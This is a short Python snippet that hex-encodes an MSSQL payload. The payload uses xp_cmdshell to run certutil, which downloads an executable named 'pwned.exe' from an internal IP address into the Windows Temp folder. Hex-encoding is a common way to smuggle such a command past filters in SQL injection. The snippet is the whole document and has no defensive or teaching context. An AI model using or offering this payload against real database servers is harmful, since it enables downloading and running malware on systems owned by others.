s = "EXEC xp_cmdshell '\''certutil -urlcache -split -f http://192.168.251.52/pwned.exe C:\\Windows\\Temp\\pwned.exe'\'"
hex_value = s.encode('utf-8').hex()
print(hex_value)
